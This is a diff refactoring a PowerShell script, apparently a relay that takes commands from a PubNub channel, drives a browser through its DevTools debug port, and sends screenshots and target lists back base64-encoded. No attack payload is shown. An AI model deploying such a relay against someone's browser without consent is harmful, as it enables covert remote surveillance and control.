@@ -658,7 +658,7 @@ $script:captureScreenshot_callback = {
             $resultout['chunkindex'] = $i
             $resultout['remainderlength'] = $remainderlength
             
-            $script:pubnubws.SendPBMessage($resultout)
+            $script:pb.SendPBMessage($resultout)
         }
     } catch {
         Log-Msg $_
@@ -1045,10 +1045,6 @@ function Send-ChunkedResult {
 function Process-BuiltInCommand {
     param([hashtable]$cmd, [PSCDP]$cdpobj)
 
-    if( $null -ne $cmd ) {
-        $cdpobj.builtincmds.Add($cmd)
-    }
-
     $resultout = @{
         builtincmd=$cmd.builtincmd
         source="pscdp.relay.ps1"
@@ -1057,6 +1053,7 @@ function Process-BuiltInCommand {
         resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
         ts=$(Get-Timestamp)
         result=$null
+        isbase64=$true
     }
 
     if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
@@ -1079,6 +1076,7 @@ function Process-BuiltInCommand {
         $ttargets = $targets | ForEach-Object { $_.GetDict() }
 
         $result = $ttargets
+
     } elseif ( $cmd.builtincmd -eq "RefreshTargets" ) {
 
         $script:clientws.AddQueue( @{ 
@@ -1225,48 +1223,34 @@ function Process-BuiltInCommand {
         throw "unsupported command [$($cmd.builtincmd)]"
     }
 
-    $resultout['result'] = $result
+    $resultout.isbase64 = $true
 
-    $script:pubnubws.SendPBMessage($resultout)
+    $json = $result | ConvertTo-Json -Depth 10
+    $tbytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+    $jsonb = "`"" + [System.Convert]::ToBase64String($tbytes) + "`""
+
+    $resultout['result'] = $jsonb
+
+    $script:pb.PublishMessage($resultout)
 }
 
 # NOTE only supports pb messages with builtincmd payload
 function Process-PubNubEvent {
 
-    param([string]$Message,[PSCDP]$cdpobj)
+    param([hashtable]$Message,[PSCDP]$cdpobj)
 
-    try {
-        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
+    # $payload = $Message | ConvertFrom-Json # should have cmdid, etc.
+    $payload = $Message
 
-        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
-            return
-        } elseif ( $payload.type -eq "PubNubStatus" ) {
-            return
-        } elseif ( ! ( $payload.message.destination -eq "pscdp.relay.ps1" ) ) {
-            return
-        }
-
-    } catch {
-
-    }
-
-    try {
-        if ( [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
-            return
-        }
-    } catch {
+    if ( $payload.source -eq "pscdp.relay.ps1" ) {
+        return
+    } elseif ( ! ( $payload.destination -eq "pscdp.relay.ps1" ) ) {
+        return
+    } elseif ( [string]::IsNullOrEmpty($payload.builtincmd) ) {
         return
     }
 
-    $cmd = $null
-
-    $cmd = $payload.message
-
-    if ( $null -ne $cmd ) {
-        $cmd = Transform-PSCustomObject($cmd)
-        Process-BuiltInCommand $cmd $cdpobj
-    }
-
+    Process-BuiltInCommand $payload $cdpobj
 }
 
 function Ping-DebugPort {
@@ -2059,7 +2043,7 @@ class PubNub {
 
         return $null
     }
-    
+
 
     [void] ReadResult() {
         if ( ! $this.isreceive ) {
@@ -2198,11 +2182,11 @@ if ( [string]::IsNullOrWhiteSpace($script:scriptfname) ) {
     $scriptfname = "pscdp.relay.ps1"
 }
 
-$pb = [PubNub]::new()
-$pb.Init()
-$pb.EventHandler = {
+$script:pb = [PubNub]::new()
+$script:pb.Init()
+$script:pb.EventHandler = {
     param([hashtable]$pbmsg)
-    
+
     Process-PubNubEvent -Message $pbmsg -cdpobj $script:clientws
 }
 
